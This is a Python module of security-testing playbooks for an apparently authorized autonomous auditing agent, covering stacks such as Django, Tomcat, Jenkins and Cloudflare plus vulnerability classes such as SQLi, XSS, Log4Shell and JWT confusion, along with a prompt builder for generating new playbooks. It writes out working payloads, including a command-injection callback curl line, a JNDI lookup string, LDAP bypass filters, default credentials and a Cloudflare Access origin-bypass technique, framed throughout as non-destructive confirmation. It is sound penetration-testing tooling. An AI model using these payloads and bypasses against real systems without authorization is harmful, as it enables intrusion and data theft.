"""Per-technology testing playbooks: concrete, in-scope checklists keyed by what was detected.

Fingerprinting tells the agent *what* the target runs; a playbook tells it *how* to test that
specific stack well. Fetching a playbook by name turns "I see WordPress" into a focused set of
high-signal checks (and which arsenal tools to use), so coverage is systematic instead of
improvised. Guidance only — the agent still runs the tools and grounds every finding; all
checks stay within the one authorized target.
"""
from __future__ import annotations

PLAYBOOKS = {
    "react-spa": """\
Single-page app (React/CRA/Vite) — the logic is client-side, so mine the bundle:
- Fetch and beautify the JS bundles (main.*.js, chunk-*.js). Extract API base URLs, route
  tables and every referenced endpoint (katana can crawl JS; or grep the beautified source).
- Recover source maps: try <bundle>.js.map; if present, reconstruct original sources.
- Extract embedded config/keys (REACT_APP_*, API keys, client IDs, feature flags). Note which
  are public-by-design (Auth0 SPA client id, Firebase config, Google Maps browser key,
  WalletConnect project id) vs. a real secret (server API keys, private tokens). Judge by
  RESTRICTION, not mere presence: is the key origin/referrer/scoped or wide open?
- retire.js on the detected libraries; cross-check versions with cve_lookup.
- trufflehog/gitleaks over the fetched JS for verified secrets.
- Then pivot to the discovered API (see the rest-api playbook).""",

    "rest-api": """\
HTTP/JSON API:
- Enumerate endpoints (from the SPA bundle, /openapi.json, /swagger.json, robots, katana, gau).
- For each: which methods are allowed, is authentication enforced, what does an unauthenticated
  request return (401 vs data)? Look for broken access control / IDOR on object ids.
- CORS: does it reflect arbitrary Origin with Access-Control-Allow-Credentials? That is exposure.
- Error verbosity: stack traces, framework banners, SQL errors in responses.
- Mass assignment, rate limiting, and auth token handling (in URL? weak JWT alg 'none'/HS/RS?).
- Test injection only non-destructively unless deeper exploitation is authorized.""",

    "graphql": """\
GraphQL endpoint (/graphql, /api/graphql):
- Introspection: run the introspection query; if enabled, map the full schema.
- Field suggestions leak even when introspection is off — probe typo'd fields.
- Authorization per field/type (broken access control), batching/alias-based abuse and query
  depth/complexity DoS surface (describe, don't actually DoS).
- Injection through resolver arguments; verbose errors.""",

    "wordpress": """\
WordPress detected:
- wpscan against the target: enumerate core version, plugins, themes and their known CVEs
  (provide --api-token via env if available for vuln data), and users (author enum).
- Check /wp-json/wp/v2/users (REST user enumeration), /xmlrpc.php (pingback/brute amplification),
  /wp-login.php, readme.html (version), /wp-content/ exposures and backup files.
- Feed plugin/theme versions to cve_lookup; prioritize KEV/high-EPSS.""",

    "django": """\
Django application (telltales: csrftoken/sessionid cookies, a `/admin/` login, `/static/` +
`/media/` or `filer_public/` paths, trailing-slash 301 habit, `X-Frame-Options`/`Referrer-Policy`
from middleware, a `__debug__/` toolbar, or a DisallowedHost/traceback page).
- VERSION, always: Django rarely banners its version, so DON'T drop it for lack of a banner — pin
  it anyway. add_component('django', <version or "unknown">) and run cve_lookup (PyPI, package
  `Django`) + cve_search. A DEBUG page prints the exact version outright (below); otherwise the
  admin-login static asset paths and default error pages shift per release. A large share of real
  Django risk is version-driven (SQLi via GIS/aggregation/`QuerySet`, account-takeover, static-file
  path traversal, DoS) — a fingerprinted-but-unversioned framework is an open coverage gap, never
  "nothing found".
- DEBUG=True is the jackpot — call the `debug-mode` playbook and confirm it. On Django it leaks
  settings, SECRET_KEY, DB credentials, installed apps, the full URLconf and the environment.
  Fastest confirmations: request a path that cannot route (the DEBUG 404 lists every URL pattern
  plus the exact Django version), or send a bogus `Host:` header (DisallowedHost renders a debug
  400). A recovered SECRET_KEY → forgeable signed sessions/cookies.
- /admin/: is the login reachable? Check user enumeration (login/password-reset timing), default
  or weak-credential policy, and the admin's own CVEs. Brute-force ONLY if explicitly authorized.
- Known classes: open redirect via `?next=`, SSRF in URL-fetching views, SQLi via `.extra()` /
  `.raw()` / unsanitised `order_by`, pickle session/cache deserialization, DRF mass assignment.
  If Django REST Framework is present, also run `rest-api`.
- Secrets: `settings.py`/`local_settings.py` leak, `.env`, `.py~`/`.pyc`, source bleed via
  `/static/`. Behind a CDN/WAF/SSO gate? The live app is on the origin — run `cloudflare-origin`.""",

    "debug-mode": """\
Framework DEBUG / verbose-error mode (one of the highest-value misconfigurations — it turns any
error into a config-and-secret leak, and is squarely in scope). You must TRIGGER an application
error and read what comes back: a clean homepage does NOT mean debug is off, because the error
path is a different code path. Force one safely, no data touched, one request each — stop as soon
as a verbose page appears:
- A path that cannot route (random long path, broken trailing segment, bad unicode).
- A malformed/unexpected `Host:` header; a bad `Content-Type` on a POST; an oversized or garbled
  parameter the view will choke on.
A positive, per stack (record the exact leaked line as the finding's quote):
- Django: a `DEBUG = True` technical-500 page (settings + env + SECRET_KEY), a 404 that LISTS the
  URLconf, or a DisallowedHost page naming ALLOWED_HOSTS — each also prints the Django version.
- Flask/Werkzeug: the interactive debugger page / `/console` PIN prompt — code execution if unlocked.
- Rails: full ActionController exception page with a source extract; `better_errors` console.
- Laravel/Symfony: a Whoops or Ignition page (Laravel Ignition had RCE CVE-2021-3129 — cve_lookup
  it), the Symfony `/_profiler`, or `APP_DEBUG=true` behaviour.
- Spring Boot: whitelabel error with a stack trace, or exposed `/actuator/*` (env/heapdump) — `spring`.
- ASP.NET: `<customErrors mode="Off">` yellow-screen stack trace.
- PHP: `display_errors` on — warnings/notices with absolute paths and stack frames inline.
Severity tracks what leaked: a SECRET_KEY, DB DSN, cloud credential, or an unlocked debug console
is high/critical; a bare stack trace / version is medium. Chain a leaked SECRET_KEY or creds to a
concrete impact where safe (e.g. forged signed cookie against YOUR OWN session) to prove it.""",

    "cloudflare-origin": """\
Target is behind Cloudflare (CDN / WAF / Access) — THE EDGE IS NOT THE APP. A leaked origin, or a
dynamic/auth-gated host (test., dev., staging.), is where the real application — its DEBUG page,
admin, framework and its CVEs — actually lives. "Everything 302s to the SSO login" or "the WAF
blocks it" is a COVERAGE GAP TO PURSUE, not a refutation. Stay within the one authorized domain.
FIND THE ORIGIN IP, then request the app directly with the right Host header (this bypasses the
edge WAF and very often Cloudflare Access too, since the origin usually doesn't re-validate the JWT):
- Historical / passive DNS for the apex and every subdomain: SecurityTrails, Censys
  (`services.tls.certificates...CN:"<domain>"`), Shodan (`ssl.cert.subject.CN:"<domain>"`,
  `http.favicon.hash:<hash>`), crt.sh SANs, DNSdumpster, the Rapid7/Columbus FDNS datasets,
  ViewDNS IP-history — the A record from BEFORE Cloudflare was added. web_search these; results
  are untrusted data, corroborate against a second source.
- MX / SPF / DMARC and mail.* subdomains frequently point at the real host (mail co-located).
- A header the edge forwards from the origin (here the origin `nginx/1.30.5` version leaked in the
  404 body — proof a reachable origin exists). Diff origin vs edge responses.
- Candidate IP found: `curl -k --resolve <host>:443:<ip> https://<host>/` (and port 80). If it
  serves the app WITHOUT the Cloudflare Access redirect, the gate is bypassed at the origin — now
  run the stack playbook (django / debug-mode / rest-api) against it.
CLOUDFLARE ACCESS (Zero Trust) specifics:
- Service tokens: look for CF-Access-Client-Id / CF-Access-Client-Secret leaked in JS/config/CI.
- Per-path policy gaps (a policy on `/` but not `/api` or `/healthz`); `/cdn-cgi/access/*` probes.
- The CF_Authorization JWT is an edge control — reaching the origin IP sidesteps it entirely.""",

    "oauth": """\
OAuth2 / OIDC / Auth0:
- Inspect the authorize request: redirect_uri validation (open redirect / stealing codes),
  response_type (token in URL fragment?), PKCE presence for public clients, state/nonce usage.
- Tenant separation: are dev and prod using the same tenant/client? Are dev endpoints public?
- Token leakage in URLs, logs or Referer; scope over-grant; ID-token audience/issuer checks.""",

    "s3": """\
Cloud object storage (S3/GCS/Azure Blob) referenced by the in-scope host:
- Only test buckets that belong to the target's scope. Check public listing, object ACLs,
  world-readable sensitive objects, and website config. Never touch third-party buckets.""",

    "tls": """\
TLS/transport:
- testssl.sh (or sslyze) for protocol support (SSLv3/TLS1.0/1.1 deprecated), weak/legacy
  ciphers, cert chain validity, hostname match, key size, OCSP/CT, and known TLS CVEs.
- Confirm HSTS (and preload), and that HTTP redirects to HTTPS.""",

    "headers": """\
HTTP security hygiene:
- Baseline headers: Strict-Transport-Security, Content-Security-Policy (and its quality),
  X-Content-Type-Options, X-Frame-Options/frame-ancestors, Referrer-Policy, Permissions-Policy.
- Cookies: Secure, HttpOnly, SameSite on session cookies. Caching of sensitive responses.
- Judge impact by context: a JSON API 401 with no session cookie carries little header risk;
  a browser-rendered authenticated page carries more.""",

    # ---- Specific systems / appliances ----------------------------------------
    "apache-tomcat": """\
Apache Tomcat:
- /manager/html and /host-manager/html: try common default/weak creds (tomcat/tomcat,
  admin/admin, tomcat/s3cret, role1/tomcat). Manager access = full RCE via WAR deployment —
  confirm ONLY that login succeeds; don't actually deploy a WAR as "proof."
- CVE-2017-12617 (PUT-based JSP upload RCE on readonly=false webapps): PUT a small HARMLESS file
  and confirm it's stored/served, rather than uploading and invoking a JSP webshell.
- Ghostcat (CVE-2020-1938, AJP connector on 8009 reachable from outside): confirm the AJP port
  answers and is exploitable with a check-only scanner, don't pull arbitrary files through it.
- /examples/, /docs/, default error pages and the `Server`/`X-Powered-By` headers leak the exact
  version — feed it to cve_lookup. Check for exposed /manager/status, /manager/jmxproxy.""",

    "jenkins": """\
Jenkins CI/CD:
- /script (Groovy script console): if reachable without auth or by a low-privilege user, this is
  full RCE. Confirm reachability/acceptance with an inert expression (e.g. evaluate `1+1`, don't
  execute shell commands) and report the exposure as critical without going further.
- /api/json for version, installed plugins and their versions (feed to cve_lookup — Jenkins
  plugins are a constant CVE source); check anonymous read/build permissions in the security
  realm, and /asynchPeople for user enumeration.
- Job configs and build console output frequently leak credentials/env vars even when the UI is
  otherwise locked down — note exposure without harvesting every secret found.""",

    "elastic": """\
Elasticsearch / Kibana (commonly deployed with no authentication):
- GET / and /_cluster/health on 9200: if it answers without auth, that alone is the finding.
  Confirm scope via /_cat/indices (index NAMES only) — don't dump documents from real indices.
- Kibana on 5601: check whether dashboards/console load without auth; if the dev console is
  reachable, don't run arbitrary queries against production indices beyond a harmless count.
- Old versions expose RCE via dynamic scripting (e.g. CVE-2015-1427, CVE-2014-3120 Groovy/MVEL
  sandbox escapes) — confirm the version via the root response and feed it to cve_lookup rather
  than executing a scripting PoC.""",

    "exposed-databases": """\
Data stores commonly left reachable without authentication (Redis, MongoDB, Memcached, CouchDB):
- Redis (6379): `PING`/`INFO` confirms unauthenticated access; STOP there. Do not `CONFIG SET
  dir`/`SAVE` (webshell-via-RDB-write), `FLUSHALL`, or load modules — these write to or destroy
  the instance. CVE-2022-0543 (Lua sandbox escape) is a hypothesis to note, not to execute.
- MongoDB (27017): connect and list database NAMES only (`listDatabases`); don't read collection
  documents.
- Memcached (11211): a `stats` command confirms unauthenticated reachability — nothing further.
- CouchDB (5984): `GET /_all_dbs` confirms exposure without reading any document.
- Any of these reachable without auth from the internet is a critical finding by itself; you do
  not need an RCE chain on top of it to justify severity.""",

    "container-orchestration": """\
Container/orchestration control-plane APIs exposed to the network:
- Docker daemon API (2375/2376 without TLS): `GET /version` or `/containers/json` confirms
  unauthenticated access, which is equivalent to root on the host via container creation — but do
  NOT create/start a container or bind-mount the host filesystem as "proof"; the API response is
  sufficient evidence on its own.
- Kubernetes API server or kubelet API (6443/8080/10250): an anonymous `GET /api/v1/namespaces`
  (apiserver) or `/pods` (kubelet) confirms exposure. Don't exec into pods, create/delete
  resources, or read Secret VALUES — listing Secret names/existence is enough.
- etcd (2379) without auth: `GET /version` or a key-listing call (not reading secret values)
  confirms exposure — etcd commonly holds cluster secrets, so stop at reachability.""",

    "atlassian": """\
Atlassian Jira / Confluence:
- Fingerprint the exact version via /status, /rest/api/2/serverInfo (Jira) or the page footer /
  REST endpoints (Confluence), then cve_lookup it — this family has repeated critical unauth
  RCEs (Confluence CVE-2022-26134 OGNL injection, CVE-2023-22515 broken-access setup bypass;
  Jira CVE-2019-11581 template injection).
- For an OGNL/template-injection CVE, confirm with an INERT expression that reflects a computed
  value (e.g. a harmless arithmetic result) in the response, not one that runs OS commands.
- Check for anonymous read access to issues/pages that should require auth, and an exposed
  /setup/ or /admin/ wizard on an already-configured instance (setup bypass).""",

    "spring": """\
Spring Boot / Spring Framework:
- Actuator endpoints (/actuator, /actuator/env, /actuator/heapdump, /actuator/httptrace,
  /actuator/mappings) often ship enabled in production and can leak config/credentials. Confirm
  exposure via the endpoint list (/actuator) and a low-sensitivity probe (/actuator/health) —
  don't download and mine a full heapdump for secrets as the "proof."
- Spring4Shell (CVE-2022-22965, Spring MVC/WebFlux on JDK9+, parameter-binding class-loader
  pollution): confirm via a parameter-binding request that sets an INERT property and observe
  its (harmless) effect — don't write a JSP webshell to the webroot.
- Feed the exact spring-boot/spring-framework/spring-cloud version to cve_lookup.""",

    "grafana": """\
Grafana:
- Fingerprint the version via /api/health or /login. CVE-2021-43798 (plugin path traversal)
  allows unauthenticated reads of arbitrary files via crafted /public/plugins/<plugin>/../..
  paths — confirm by reading ONE recognizable, non-sensitive file (e.g. confirm grafana.ini
  exists) rather than pulling provisioning files with datasource credentials.
- Check for default admin/admin credentials and whether anonymous org/viewer access is enabled
  beyond what's intended.""",

    "php": """\
PHP applications:
- phpinfo() exposure (/phpinfo.php, /info.php, /test.php) leaks the full environment/config —
  confirm existence and the PHP version, don't harvest every disclosed variable into the report.
- Backup/editor-swap and VCS artifacts: composer.lock, .env, config.php.bak, *.php~, *.php.swp,
  .git/ (see secrets-exposure for how to confirm these safely).
- PHP Object Injection via unserialize() on user-controlled input: confirm with an INERT gadget
  (one whose __wakeup/__destruct produces an observable side effect you control, e.g. a harmless
  log line) rather than a working RCE/file-write chain.
- Local file inclusion combined with PHP wrappers (php://filter) to read SOURCE rather than
  execute it: confirm disclosure of one file's source, not a full application dump.""",

    # ---- Safe, non-destructive PoC recipes per vuln class --------------------
    # The general discipline (see `poc` below) plus a concrete, low-risk confirmation
    # technique per class: prove impact with a read-only or out-of-band signal, never by
    # actually performing the harmful action. Capture the raw signal with `add_evidence`
    # and cite it as poc_evidence_id/poc_quote on the finding — the quote IS the proof.
    "poc": """\
SAFE, NON-DESTRUCTIVE POC — the general discipline (applies to every class below):
- Read, don't write: prove the exploit path works by observing something, not by changing or
  destroying target state. If confirming it truly requires a write/delete, STOP — record it as
  a hypothesis with your reasoning and describe the manual step for an authorized human instead.
- Out-of-band over in-band where possible: a callback hit (DNS/HTTP to infra you control) or a
  timing delta proves code/query execution without needing to see sensitive output.
- Minimal and single-shot: one clean proof, not a loop; no scans or payload sprays once confirmed.
- In scope only: any callback/out-of-band listener you use must be yours, not a reused public
  service that could leak the hit to someone else, and never a third-party host.
- Capture it: `add_evidence` the raw request/response or callback log, then `record_finding`
  with `poc_evidence_id`/`poc_quote` set to the exact slice proving it. Call `playbook` with the
  specific class name below (e.g. "sql-injection") when you have a concrete hypothesis to test.
- STRONGEST proof is DIFFERENTIAL: run the probe TWICE — once WITH the payload and once as a
  CONTROL (no payload / benign value) — and save BOTH as separate evidence items. Cite the control
  as `poc_baseline_evidence_id`/`poc_baseline_quote` and the payload result as `poc_evidence_id`/
  `poc_quote`, and set `poc_method` (differential | timing | out_of_band). The report then shows the
  payload changing the observable signal versus the baseline. Identical baseline and payload output
  means NO effect — that refutes the hypothesis, it is not a finding.""",

    "sql-injection": """\
SQLi — confirm without touching real data:
- Boolean-blind: compare response for `' AND 1=1-- -` vs `' AND 1=2-- -` (or numeric equivalents)
  on the same endpoint/params; a content/length/status diff confirms the query is reachable.
- Time-blind (when boolean diff is inconclusive or output is identical either way): inject a
  single `SLEEP(5)`/`pg_sleep(5)`/`WAITFOR DELAY '0:0:5'` and measure the added latency against a
  baseline request — don't stack multiple sleeps or loop it.
- If you must prove data access, read exactly ONE innocuous value (`SELECT version()`,
  `current_user`, `@@version`) via UNION/error-based — never a real user table, and never dump
  more than that single proof value.
- Never: INSERT/UPDATE/DELETE/DROP, stacked queries that write, or extracting bulk/sensitive rows.
- sqlmap in confirm-only mode (`--batch --level=1 --risk=1`, no `--dump`) is fine for detection;
  do not let it escalate to dumping or tampering.""",

    "xss": """\
XSS — confirm reflection/storage without touching other users:
- Use a harmless, unique marker payload scoped to YOUR OWN session/request — e.g. a string that
  writes to console or injects an inert, visibly-tagged DOM node (`<img src=x onerror=...tag...>`
  with a random marker you grep for), not one that exfiltrates cookies or calls out to pivot.
- Confirm it renders UNESCAPED in the response/DOM (view-source or a headless fetch), not just
  that it was accepted — acceptance without reflection is not XSS.
- Stored XSS: use a marker you can clean up or that is clearly scoped to a test object you
  created; don't inject into shared/public content other real users will see.
- Never: cookie/session theft, redirecting other users, keylogging, or payloads that persist
  beyond what's needed to prove reflection.""",

    "ssrf": """\
SSRF — confirm server-side fetch without touching internal systems:
- Point the vulnerable parameter at an out-of-band endpoint YOU control (e.g. your own
  request-catcher/webhook URL, or a DNS name you can check resolution logs for) and confirm the
  callback arrives — this proves the server fetches attacker-controlled URLs server-side.
- If no OOB listener is available, a safe in-scope alternative is a URL that returns a
  distinctive, identifiable response (your own reachable endpoint) rather than an internal one.
- Never point it at cloud metadata endpoints (169.254.169.254), internal IP ranges, or other
  internal services beyond confirming the fetch itself occurred — reading metadata/secrets is a
  separate, higher-impact step that needs explicit authorization, not an automatic next action.""",

    "idor": """\
IDOR / broken object-level access control:
- Use your OWN authenticated session to request an object ID adjacent to one you own (e.g.
  `/orders/1235` when your order is `1234`) and confirm you get a DIFFERENT user's data back
  (not a 403/404) — one request is enough to prove it.
- Prefer confirming via metadata that is unambiguously another user's (an email, username, or ID
  that isn't yours) rather than pulling full sensitive records; don't enumerate further once
  confirmed.
- Never: bulk-enumerate other users' objects, modify/delete another user's data, or use the
  access to pivot into their account.""",

    "command-injection": """\
OS command injection — confirm execution without a payload that does anything:
- Use inert, read-only commands: `id`, `whoami`, `echo <unique-marker>`, `sleep 5` (timing proof
  if output isn't reflected). Compare against a baseline request to rule out coincidence.
- Out-of-band confirms it cleanly too: `curl http://<your-callback>/$(id -u)` style, so you
  don't need command output to be reflected in the response at all.
- Never: reverse shells, downloading/executing further payloads, writing files, or any command
  that modifies the host, installs persistence, or reads credential material.""",

    "path-traversal": """\
Path traversal / LFI — confirm read access to one known file, not a tour of the filesystem:
- Request a single well-known, non-sensitive file whose content you can recognize (e.g. a banner
  file, a version file, or — if it must be a system file — `/etc/hostname` rather than
  `/etc/shadow` or `/etc/passwd`'s full contents) and quote just enough to prove traversal worked.
- Stop at the first successful read. Don't pull application source, config files with secrets,
  or credential stores as the "proof" — note that deeper impact is possible and describe it, but
  don't demonstrate it by actually extracting the sensitive file.""",

    "deserialization": """\
Insecure deserialization / gadget-chain RCE candidates:
- Prefer an out-of-band gadget (DNS/HTTP callback to infra you control) that proves code
  execution happened, over a working reverse shell or file write.
- If OOB isn't feasible, use the most inert gadget available (e.g. a sleep/timing gadget) rather
  than one that writes files, spawns shells, or modifies application state.
- Never deploy a full RCE chain beyond the minimum needed to observe the callback/timing signal;
  don't use it to read files, pivot, or persist.""",

    "secrets-exposure": """\
Exposed secrets / sensitive files (.env, .git, backups, cloud keys):
- Confirm EXISTENCE and FORMAT only: fetch the file, check it matches the expected shape (e.g.
  `.env` has `KEY=value` lines, `.git/config` is a real git config), and quote a short, clearly
  non-sensitive slice (a key NAME, not its value) as proof.
- Do not use any live credential you find against the service it authenticates to, a cloud
  provider API, or any third-party host — that is a separate authorization boundary. Note the
  exposure and its likely impact; do not validate the secret by using it.
- Never exfiltrate the full file contents into the report if it contains real secrets — quote
  only what's needed to prove the exposure (filename, structure, a redacted/partial value).""",

    "log4shell": """\
Log4Shell (CVE-2021-44228, Apache Log4j2 JNDI RCE) and its JNDI-injection cousins:
- Identify likely-logged, attacker-controlled inputs: User-Agent, X-Forwarded-For, Referer,
  request params, JSON/form fields, auth usernames — anything an app might pass to a logger.
- Inject a JNDI lookup pointing at an OOB collaborator YOU control, tagged per field/endpoint
  with a unique marker subdomain, e.g. `${jndi:ldap://<marker>.<your-collaborator>/a}` (try
  `dns://` too if only DNS egress is plausible).
- Confirm via YOUR collaborator's interaction log: a DNS/LDAP hit for your marker proves the
  string was parsed and a JNDI resolution was attempted — that alone is sufficient proof. Do NOT
  stand up an LDAP/RMI responder that serves a real payload back (no gadget class, no code
  loading); resolving the lookup is the confirmation, completing the RCE chain is a separate,
  higher-impact step this assessment does not take.
- cve_lookup the identified log4j-core version (vulnerable: ~2.0-beta9 through 2.14.1 for the
  JNDI lookup; patched: 2.17.1+, or the 2.3.2/2.12.4 backports). Treat a hit on your collaborator
  as critical regardless of exact version, since vendor repackaging can obscure it.""",

    "ssti": """\
Server-side template injection (SSTI):
- Probe with an arithmetic marker per likely engine: `{{7*7}}` (Jinja2/Twig/Nunjucks), `${7*7}`
  (FreeMarker/EL/Thymeleaf), `#{7*7}` (Ruby Slim), `<%= 7*7 %>` (ERB). A response containing `49`
  instead of the literal payload confirms server-side evaluation.
- Escalate only as far as needed to identify the exact engine (e.g. an engine-fingerprinting
  expression), then STOP — don't chain to file reads or process execution; that's the
  `command-injection`/`path-traversal` recipe's job once you've confirmed SSTI exists.""",

    "xxe": """\
XML External Entity (XXE) injection:
- Out-of-band is safest: declare an external entity pointing at a collaborator URL/DNS name YOU
  control and confirm the request/lookup arrives — proves the parser resolves external entities
  without needing to read anything sensitive.
- If only in-band (reflected into the response) XXE is exploitable, read ONE small, recognizable,
  non-sensitive file (a version/banner file) via `file://`, not application source, config, or
  credential files.
- Never attempt entity-expansion ("billion laughs") payloads — that's a DoS, not a PoC.""",

    "ldap-injection": """\
LDAP injection:
- Boolean-blind, same idea as SQLi: compare a filter like `(&(uid=x)(extra=1))` vs
  `(&(uid=x)(extra=2))` for a response/result-count diff to confirm the filter is attacker-
  influenced.
- Auth-bypass style: a filter such as `*)(uid=*))(|(uid=*` in a login/search field that returns
  more entries than expected, or authenticates without a valid password, confirms the injection —
  one request is enough; don't iterate into a full directory dump.
- Never modify or delete directory entries (no injected add/modify/delete operations).""",

    "jwt": """\
JWT authentication weaknesses:
- Algorithm confusion: resubmit a token with the signature stripped and `"alg":"none"`, or (if
  the server uses RS256 and its public key is known/leaked) re-sign as HS256 using that public
  key as the HMAC secret. Confirm the server ACCEPTS it by checking you still get authenticated
  access on YOUR OWN account's claims — don't forge another user's identity or escalate a role
  unless privilege escalation is specifically the hypothesis, and even then change the minimum
  claim needed and stop at observing the access granted, without acting on it further.
- Weak/guessable HMAC secret: crack a captured token OFFLINE (hashcat/john against a wordlist)
  rather than brute-forcing the live login endpoint.
- Header injection via `kid`/`jku`/`x5u` (the key-lookup parameter): treat whatever it enables
  (SQLi, SSRF, path traversal) as its own class and use that class's safe recipe, not this one.""",
}

# Common fingerprint aliases → canonical playbook name.
_ALIAS = {
    "react": "react-spa", "spa": "react-spa", "cra": "react-spa", "vue": "react-spa",
    "angular": "react-spa", "vite": "react-spa", "nextjs": "react-spa",
    "api": "rest-api", "rest": "rest-api", "openapi": "rest-api", "swagger": "rest-api",
    "wp": "wordpress", "auth0": "oauth", "oidc": "oauth", "oauth2": "oauth",
    "ssl": "tls", "https": "tls", "aws-s3": "s3", "bucket": "s3",
    "security-headers": "headers", "csp": "headers", "cookies": "headers",
    # specific systems / appliances
    "tomcat": "apache-tomcat", "ghostcat": "apache-tomcat",
    "ci-cd": "jenkins", "cicd": "jenkins",
    "elasticsearch": "elastic", "kibana": "elastic", "opensearch": "elastic",
    "redis": "exposed-databases", "mongodb": "exposed-databases", "mongo": "exposed-databases",
    "memcached": "exposed-databases", "couchdb": "exposed-databases", "nosql": "exposed-databases",
    "docker": "container-orchestration", "kubernetes": "container-orchestration",
    "k8s": "container-orchestration", "kubelet": "container-orchestration", "etcd": "container-orchestration",
    "jira": "atlassian", "confluence": "atlassian",
    "spring-boot": "spring", "actuator": "spring", "spring4shell": "spring",
    "php-app": "php",
    # python / framework stacks
    "drf": "django", "django-rest-framework": "django", "python-django": "django",
    # debug / verbose-error mode (framework-agnostic)
    "debug": "debug-mode", "debug-endpoints": "debug-mode", "verbose-errors": "debug-mode",
    "stacktrace": "debug-mode", "stack-trace": "debug-mode", "werkzeug": "debug-mode",
    "whoops": "debug-mode", "ignition": "debug-mode", "customerrors": "debug-mode",
    "flask": "debug-mode", "laravel": "debug-mode", "symfony": "debug-mode", "rails": "debug-mode",
    "whitelabel": "debug-mode", "display-errors": "debug-mode",
    # CDN / WAF origin exposure + Cloudflare Access bypass
    "cloudflare": "cloudflare-origin", "cloudflare-access": "cloudflare-origin",
    "cf-access": "cloudflare-origin", "zero-trust": "cloudflare-origin", "origin": "cloudflare-origin",
    "origin-ip": "cloudflare-origin", "waf-bypass": "cloudflare-origin", "cdn": "cloudflare-origin",
    "cdn-bypass": "cloudflare-origin",
    # safe-PoC recipes
    "safe-poc": "poc", "non-destructive-poc": "poc", "poc-recipes": "poc",
    "sqli": "sql-injection", "sql": "sql-injection",
    "cross-site-scripting": "xss", "stored-xss": "xss", "reflected-xss": "xss",
    "server-side-request-forgery": "ssrf",
    "broken-access-control": "idor", "bola": "idor", "idor-bac": "idor",
    "rce": "command-injection", "cmdi": "command-injection", "os-command-injection": "command-injection",
    "lfi": "path-traversal", "directory-traversal": "path-traversal", "file-inclusion": "path-traversal",
    "insecure-deserialization": "deserialization", "gadget-chain": "deserialization",
    "exposed-secrets": "secrets-exposure", "leaked-secrets": "secrets-exposure",
    "git-exposure": "secrets-exposure", "backup-files": "secrets-exposure",
    "log4j": "log4shell", "cve-2021-44228": "log4shell", "jndi-injection": "log4shell", "jndi": "log4shell",
    "template-injection": "ssti", "server-side-template-injection": "ssti",
    "xml-external-entity": "xxe", "xee": "xxe",
    "ldap": "ldap-injection",
    "jwt-auth": "jwt", "json-web-token": "jwt", "alg-none": "jwt",
}


def names() -> list[str]:
    return sorted(PLAYBOOKS)


_MISS_PREFIX = "No playbook named "


def get(name: str) -> str:
    key = str(name or "").strip().lower()
    key = _ALIAS.get(key, key)
    return PLAYBOOKS.get(key) or (
        f"{_MISS_PREFIX}{name!r}. Available: {', '.join(names())}. "
        "Proceed from the general checklist and your own testing plan.")


def is_miss(text: str) -> bool:
    """True when `get()` returned the no-curated-playbook sentinel rather than a real recipe."""
    return isinstance(text, str) and text.startswith(_MISS_PREFIX)


# A few curated playbooks double as style/safety exemplars for generated ones: one framework,
# one specific system, one safe-PoC recipe — enough to anchor voice, density and discipline.
_EXEMPLAR_KEYS = ("django", "spring", "non-destructive-poc")


def exemplars() -> str:
    out = []
    for k in _EXEMPLAR_KEYS:
        body = PLAYBOOKS.get(k)
        if body:
            out.append(f"### Example playbook — {k}\n{body}")
    return "\n\n".join(out)


def generation_messages(name: str, context: str, scope_text: str, seed: str = "") -> list[dict]:
    """Chat messages that ask the model to WRITE one playbook for a just-detected stack.

    This is the generic path: rather than capping coverage at a hand-written set, the agent
    detects a platform and the model authors a focused, in-scope, non-destructive testing plan on
    the fly — grounded in whatever evidence the agent passes as `context`. When a curated recipe
    exists for this stack it is passed as `seed` reference knowledge to adapt and extend, not to
    repeat verbatim.
    """
    system = (
        "You write ONE focused, high-signal security-testing playbook for a specific technology, "
        "platform, framework, CMS, service/appliance, or vulnerability class that an autonomous, "
        "AUTHORIZED web/host auditor has just detected on its single in-scope target.\n\n"
        "Output ONLY the playbook body, nothing else: a short intro line naming the telltales that "
        "identify this stack, then 5-10 concrete, ordered bullet checks. Requirements:\n"
        "- Every check must be NON-DESTRUCTIVE and stay within the one authorized target. Prefer "
        "read-only or out-of-band signals that prove impact without touching data or other users.\n"
        "- For any versioned component, tell the agent to `add_component` it and run the CVE loop "
        "(`cve_lookup` exact package+version, plus `cve_search` by keyword/CPE); if the version is "
        "not bannered, say exactly how to pin it. Lead with the single highest-impact "
        "misconfiguration or CVE class for this stack.\n"
        "- Name the exact arsenal tools to use for each check.\n"
        "- Match the voice, density and safety discipline of the examples. No preamble, no markdown "
        "headings, no closing commentary — just the playbook text.\n\n"
        + scope_text + "\n\n"
        "Style exemplars (match these):\n\n" + exemplars())
    user = f"Detected technology / target to write a playbook for: {name!r}."
    if context:
        user += ("\n\nWhat the agent actually observed — GROUND the playbook in this, don't be "
                 f"generic:\n{context[:2000]}")
    if seed:
        user += ("\n\nA curated reference recipe exists for this stack. ADAPT and EXTEND it to what "
                 "was observed above — tailor it, add what's missing, drop what doesn't apply; do "
                 f"not just repeat it:\n{seed}")
    user += ("\n\nWrite the playbook now: telltales line, then the ordered non-destructive checks, "
             "version-pinning guidance, and the highest-impact thing to test first.")
    return [{"role": "system", "content": system}, {"role": "user", "content": user}]
